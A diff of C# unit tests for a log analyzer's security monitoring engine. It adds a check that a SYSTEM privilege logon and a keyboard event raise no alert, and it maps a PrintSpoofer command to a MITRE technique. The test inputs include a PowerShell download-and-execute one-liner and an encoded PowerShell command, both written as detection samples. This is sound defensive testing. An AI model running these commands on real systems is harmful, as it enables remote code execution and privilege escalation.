@@ -60,6 +60,21 @@ namespace LogAnalyzer.UI.Tests
         public void A_bare_keyword_or_normal_administration_raises_nothing(string text) =>
             Assert.Null(new LiveSecurityMonitoringEngine().EvaluateLiveEvent(Cmd(text)));
 
+        [Fact]
+        public void Windows_own_special_privilege_logon_and_an_ordinary_keyboard_raise_nothing()
+        {
+            // lab VM 2026-11-06: every 4672 for SYSTEM lists SeImpersonatePrivilege and raised a CRITICAL "Potato" alert at start-up
+            var special = new ParsedEvent
+            {
+                EventId = 4672, MachineName = "WS-01", TimeCreated = T0,
+                Message = "Special privileges assigned to new logon.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tSYSTEM\r\n\tAccount Name:\t\tSYSTEM\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\r\nPrivileges:\t\tSeAssignPrimaryTokenPrivilege\r\n\t\t\tSeTcbPrivilege\r\n\t\t\tSeImpersonatePrivilege\r\n\t\t\tSeDelegateSessionUserImpersonatePrivilege",
+            };
+            Assert.Null(new LiveSecurityMonitoringEngine().EvaluateLiveEvent(special));
+            var keyboard = new ParsedEvent { EventId = 112, MachineName = "WS-01", TimeCreated = T0, Message = "Device HID\\VID_045E&PID_07B2&MI_00\\7&1a2b (HID Keyboard Device) was configured." };
+            Assert.Null(new LiveSecurityMonitoringEngine().EvaluateLiveEvent(keyboard));
+            Assert.Equal("T1134.001", new LiveSecurityMonitoringEngine().EvaluateLiveEvent(Cmd(@"C:\Users\Public\PrintSpoofer64.exe -i -c cmd"))!.MitreTechniqueId);
+        }
+
         [Theory]
         [InlineData("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "T1059.001")]
         [InlineData("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\"", "T1059.001")]
